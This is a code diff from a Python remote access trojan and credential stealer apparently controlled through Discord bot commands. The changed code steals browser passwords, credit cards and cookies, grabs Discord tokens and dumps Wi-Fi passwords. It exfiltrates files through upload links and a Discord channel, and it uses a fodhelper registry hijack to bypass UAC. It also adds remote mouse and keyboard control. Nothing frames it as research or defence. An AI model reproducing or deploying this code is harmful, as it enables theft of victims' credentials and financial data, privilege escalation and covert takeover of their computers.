+                    "login_data": [f"{mainfolder}\\p4ssw0rds.txt", "`🔑 Passwords`"],
+                    "credit_cards": [f"{mainfolder}\\cr3d1tc4rds.txt", "`💳 Credit Cards`"],
+                    "history": [f"{mainfolder}\\h1st0ry.txt", "`📜 History`"],
+                    "cookies": [f"{mainfolder}\\c0okies.txt", "`🍪 Cookies`"],
+                    "downloads": [f"{mainfolder}\\d0wnloads.txt", "`💾 Downloads`"],
                 }
 
-                datatypesembeds = {
-                    "`🔑 Passwords`": p4ssw0rds,
-                    "`🍪 Cookies`": c0okies,
-                    "`📜 History`": h1st0ry,
-                    "`💳 Credit Cards`": cr3d1tc4rds,
-                    "`💾 Downloads`": d0wnloads,
-                }
-
-                for p in datatypes.values():
-                    if os.path.exists(p):
-                        os.remove(p)
+                for p in info.values():
+                    if os.path.exists(p[0]):
+                        os.remove(p[0])
                 for browser in installedbrowsers():
                     os.system(f"taskkill /f /im {browser[3]}")
                     path = browser[1]
                     key = getkey(path)
 
                     for data_type_name, data_type in dataqueries.items():
-                        datafile = open(datatypes[data_type_name], "a", encoding="utf-8")
+                        datafile = open(info[data_type_name][0], "a", encoding="utf-8")
                         data = getbrowserdata(path, "Default", key, data_type)
                         if data is not None:
                             if len(data) > 0:
@@ -1005,19 +911,19 @@ del CreateShortcut.vbs
                 embed.set_thumbnail(
                     url=gifs['earth'])
 
-                for e in datatypesembeds.keys():
-                    if os.path.getsize(datatypesembeds[e]) > 0:
+                for e in info.keys():
+                    if os.path.getsize(info[e][0]) > 0:
                         embed.add_field(
                             name="",
-                            value=f'`╓` {e}'
-                                  f'\n`╟` `🔎 Found: ` `{open(datatypesembeds[e], "r", encoding="utf-8").read().count("╠")}`'
-                                  f'\n`╙` [{datatypesembeds[e].split("//")[-1]}]({getfileio(datatypesembeds[e])})',
+                            value=f'`╓` {info[e][1]}'
+                                  f'\n`╟` `🔎 Found: ` `{open(info[e][0], "r", encoding="utf-8").read().count("╠")}`'
+                                  f'\n`╙` [{info[e][0].split(bs)[-1]}]({getfileio(info[e][0])})',
                             inline=True,
                         )
-                embed.set_footer(text=textclientinfo)
+                embed.set_footer(text=SHORTCLIENTINFO)
                 await message.channel.send(embed=embed)
 
-            if basecommand == "!grabdiscord":
+            if args[0] == "!grabdiscord":
                 def decryptval(buff, master_key=None):
                     starts = buff.decode(encoding="utf8", errors="ignore")[:3]
                     if starts in ("v10", "v11"):
@@ -1047,12 +953,12 @@ del CreateShortcut.vbs
                                             discordtokens.append([path, token])
 
                 def getdiscord(path, arg):
-                    if not os.path.exists(f"{path}/Local State"):
+                    if not os.path.exists(f"{path}\\Local State"):
                         return
 
                     pathC = path + arg
 
-                    pathKey = path + "/Local State"
+                    pathKey = path + "\\Local State"
                     with open(pathKey, "r", encoding="utf-8") as f:
                         local_state = json.loads(f.read())
                     master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
@@ -1127,30 +1033,30 @@ del CreateShortcut.vbs
                         pass
                 for e in embedlist: await message.channel.send(embed=e)
 
-            if basecommand == "!upload":
+            if args[0] == "!upload":
                 if os.path.exists(args[1]) and len(message.attachments) > 0:
                     output = ""
-                    await message.attachments[0].save(args[1] + r"//" + message.attachments[0].filename)
+                    await message.attachments[0].save(args[1] + r"\\" + message.attachments[0].filename)
                     output += f"┏ 📁 File {message.attachments[0].filename}\n"
                     for attachment in message.attachments[1:]:
                         filename = attachment.filename
                         print(filename)
-                        savepath = args[1] + r"//" + filename
+                        savepath = args[1] + "\\" + filename
                         await attachment.save(savepath)
                         output += f"┣ 📁 File {filename}\n"
                     output += f"┗━▶ 📦 Saved to {args[1]}\n"
                     embed = discord.Embed(color=0x2B2D31, title="`📮 File upload succesful!`",
                                           description=f"```{output}```")
                     embed.set_thumbnail(
-                        url=list(gifs.values())[random.randrange(0,len(list(gifs.values())))])
-                    embed.set_footer(text=textclientinfo)
+                        url=list(gifs.values())[random.randrange(0, len(list(gifs.values())))])
+                    embed.set_footer(text=SHORTCLIENTINFO)
                     await message.channel.send(embed=embed)
 
-            if basecommand == "!sendfile":
+            if args[0] == "!sendfile":
                 for path in args[1:]:
                     await message.channel.send(embed=getfileembed(path))
 
-            if basecommand == "!wifi":
+            if args[0] == "!wifi":
                 command_output = subprocess.run(["netsh", "wlan", "show", "profiles"],
                                                 capture_output=True).stdout.decode()
                 profile_names = (re.findall("All User Profile     : (.*)\r", command_output))
@@ -1178,15 +1084,15 @@ del CreateShortcut.vbs
                 output = ""
                 maxwifilen = max([len(wifi["Wifi"]) for wifi in wifi_list])
                 maxpasslen = max([len(wifi["Password"]) for wifi in wifi_list])
-                output += "WIFI NAME" + " " * (maxwifilen - len("WIFI NAME") + 1) + "║ " + "PASSWORD\n"
-                output += ("═" * maxwifilen + "═╬═" + "═" * maxpasslen + "\n")
+                output += "WIFI NAME" + " " * (maxwifilen - len("WIFI NAME") + 1) + "┃ " + "PASSWORD\n"
+                output += ("━" * maxwifilen + "━╋━" + "━" * maxpasslen + "\n")
                 for x in wifi_list:
-                    output += (x["Wifi"] + " " * (maxwifilen - len(x['Wifi']) + 1) + "║ " + x["Password"]) + "\n"
-                writetofile(output, TEMP + "/wifi.txt")
+                    output += (x["Wifi"] + " " * (maxwifilen - len(x['Wifi']) + 1) + "┃ " + x["Password"]) + "\n"
+                writetofile(output, TEMP + "\\wifi.txt")
 
-                await message.channel.send(file=File(TEMP + "/wifi.txt"))
+                await message.channel.send(file=File(TEMP + "\\wifi.txt"))
 
-            if basecommand == "!drives":
+            if args[0] == "!drives":
                 def btogb(b):
                     KB = 1000
                     MB = KB * 1000
@@ -1202,26 +1108,28 @@ del CreateShortcut.vbs
                         free += int(psutil.disk_usage(disk.mountpoint).free)
 
                     a += f"```💿 {disk.device} {btogb(total)} TOTAL, {btogb(used)} USED, {btogb(free)} FREE```"
-                embed = discord.Embed(color=0x2B2D31, title=f"`💾 Available logical drives:`")
+                embed = discord.Embed(color=0x2B2D31, title=f"`📋 Available logical drives:`")
                 embed.add_field(
                     name="", value=f"{a}", inline=True
                 )
-                embed.set_footer(text=textclientinfo)
+                embed.set_footer(text=SHORTCLIENTINFO)
                 await message.channel.send(embed=embed)
 
-            if basecommand == "!geolocate":
+            if args[0] == "!geolocate":
                 with urllib.request.urlopen("https://geolocation-db.com/json") as url:
                     data = json.loads(url.read().decode())
                     link = f"http://www.google.com/maps/place/{data['latitude']},{data['longitude']}"
                     embed = discord.Embed(color=0x2B2D31, title=f"`🌎` Location link",
-                                          description=f"`🔛 Latitude` `{data['latitude']}`\n`🔝 Longitude:` `{data['longitude']}`")
+                                          description=f"`Latitude` `{data['latitude']}`\n`Longitude:` `{data['longitude']}`")
                     embed.url = link
-                    embed.set_footer(text=textclientinfo)
-                    embed.set_thumbnail(
-                        url="https://cdn.discordapp.com/attachments/942481541068628018/1218294802206953663/output-onlinegiftools.gif?ex=66072473&is=65f4af73&hm=7eee0a5fe9f79114e745f163a98be6aa701d6384563a05ff4f14a60822bbdca7&")
+                    embed.set_footer(text=SHORTCLIENTINFO)
                     await message.channel.send(embed=embed)
 
-            if basecommand == "!findallfiles":
+            if args[0] == "!findallfiles":
+                if len(args) < 3:
+                    args.append(args[1])
+                    args[1] = os.getcwd()
+
                 def findallfiles(directory, keyword):
                     filepaths = []
                     for root, _, files in os.walk(directory):
@@ -1243,11 +1151,15 @@ del CreateShortcut.vbs
                 writetofile(stringfilepaths, f"{TEMP}/filelist.txt")
                 embed = discord.Embed(color=0x2B2D31,
                                       description=f"`🔎 Found {len(filepaths)} files!` \n`🔑 Keywords:` `{keywords}` \n`📁 File paths:`")
-                embed.set_footer(text=textclientinfo)
+                embed.set_footer(text=SHORTCLIENTINFO)
                 await message.channel.send(embed=embed)
                 await message.channel.send(file=File(f"{TEMP}/filelist.txt"))
 
-            if basecommand == "!sendallfiles":
+            if args[0] == "!sendallfiles":
+                if len(args) < 3:
+                    args.append(args[1])
+                    args[1] = os.getcwd()
+
                 def findallfiles(directory, keyword):
                     filepaths = []
                     for root, _, files in os.walk(directory):
@@ -1274,7 +1186,7 @@ del CreateShortcut.vbs
                                       description=f"`🔎 Found {len(filepaths)} files!` \n`🔑 Keywords:` `{unsplit(args[2:])}` \n`📁 ZIP File:`")
                 embed.set_thumbnail(
                     url="https://cdn.discordapp.com/emojis/1216135035233763529.gif?size=96&quality=lossless")
-                embed.set_footer(text=textclientinfo)
+                embed.set_footer(text=SHORTCLIENTINFO)
 
                 await message.channel.send(embed=embed)
                 await message.channel.send(embed=getfileembed(zipfilepath))
@@ -1282,45 +1194,82 @@ del CreateShortcut.vbs
                 shutil.rmtree(destination)
                 os.remove(zipfilepath)
 
-            if basecommand == "!uacelevate":
-                if not adm1n:
-                    pidfile = open(f"{TEMP}//uacelevate.txt", "w")
+            if args[0] == "!uacbypass":
+                def isAdmin():
+                    try:
+                        is_admin = (os.getuid() == 0)
+                    except AttributeError:
+                        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
+                    return is_admin
+                if isAdmin():
+                    await message.channel.send("`👑 Your already admin!`")
+                else:
+                    class disable_fsr():
+                        disable = ctypes.windll.kernel32.Wow64DisableWow64FsRedirection
+                        revert = ctypes.windll.kernel32.Wow64RevertWow64FsRedirection
+                        def __enter__(self):
+                            self.old_value = ctypes.c_long()
+                            self.success = self.disable(ctypes.byref(self.old_value))
+                        def __exit__(self, type, value, traceback):
+                            if self.success:
+                                self.revert(self.old_value)
+                    await message.channel.send("`❓ Trying to get admin...`")
+                    pidfile = open(f"{TEMP}\\uac.txt", "w")
                     pidfile.write(str(processid))
                     pidfile.close()
-                    ctypes.windll.shell32.ShellExecuteW(
-                        None, "runas", sys.executable, " ".join(sys.argv), None, 1
-                    )
 
-            if basecommand == "!mu":
+                    if not sys.argv[0].endswith("exe"):
+                        cmd2 = sys.argv[0]
+                        create_reg_path = """ powershell New-Item "HKCU:\SOFTWARE\Classes\ms-settings\Shell\Open\command" -Force """
+                        os.system(create_reg_path)
+                        create_trigger_reg_key = """ powershell New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "hi" -Force """
+                        os.system(create_trigger_reg_key)
+                        create_payload_reg_key = """powershell Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "`(Default`)" -Value "'cmd /c start python """ + '""' + '"' + '"' + cmd2 + '""' +  '"' + '"\'"' + """ -Force"""
+                        os.system(create_payload_reg_key)
+                    else:
+                        cmd2 = sys.argv[0]
+                        create_reg_path = """ powershell New-Item "HKCU:\SOFTWARE\Classes\ms-settings\Shell\Open\command" -Force """
+                        os.system(create_reg_path)
+                        create_trigger_reg_key = """ powershell New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "hi" -Force """
+                        os.system(create_trigger_reg_key)
+                        create_payload_reg_key = """powershell Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "`(Default`)" -Value "'cmd /c start """ + '""' + '"' + '"' + cmd2 + '""' +  '"' + '"\'"' + """ -Force"""
+                        os.system(create_payload_reg_key)
+                    with disable_fsr():
+                        os.system("fodhelper.exe")
+                    time.sleep(2)
+                    remove_reg = """ powershell Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force """
+                    os.system(remove_reg)
+
+            if args[0] == "!mu":
                 if len(args) != 1:
                     pyautogui.moveTo(pyautogui.position().x, pyautogui.position().y - int(args[1]) * 10)
                 else:
                     pyautogui.moveTo(pyautogui.position().x, pyautogui.position().y - 10 * 10)
-            if basecommand == "!md":
+            if args[0] == "!md":
                 if len(args) != 1:
                     pyautogui.moveTo(pyautogui.position().x, pyautogui.position().y + int(args[1]) * 10)
                 else:
                     pyautogui.moveTo(pyautogui.position().x, pyautogui.position().y + 10 * 10)
-            if basecommand == "!ml":
+            if args[0] == "!ml":
                 if len(args) != 1:
                     pyautogui.moveTo(pyautogui.position().x - int(args[1]) * 10, pyautogui.position().y)
                 else:
                     pyautogui.moveTo(pyautogui.position().x - 10 * 10, pyautogui.position().y)
-            if basecommand == "!mr":
+            if args[0] == "!mr":
                 if len(args) != 1:
                     pyautogui.moveTo(pyautogui.position().x + int(args[1]) * 10, pyautogui.position().y)
                 else:
                     pyautogui.moveTo(pyautogui.position().x + 10 * 10, pyautogui.position().y)
 
-            if basecommand == "!lmb":
+            if args[0] == "!lmb":
                 pyautogui.leftClick()
-            if basecommand == "!rmb":
+            if args[0] == "!rmb":
                 pyautogui.rightClick()
-            if basecommand == "!write":
+            if args[0] == "!write":
                 pyautogui.write(args[1])
-            if basecommand == "!press":
+            if args[0] == "!press":
                 pyautogui.press(args[1])
-            if basecommand == "!shortcut":
+            if args[0] == "!shortcut":
                 shortcut(args[2], args[1])
 
 
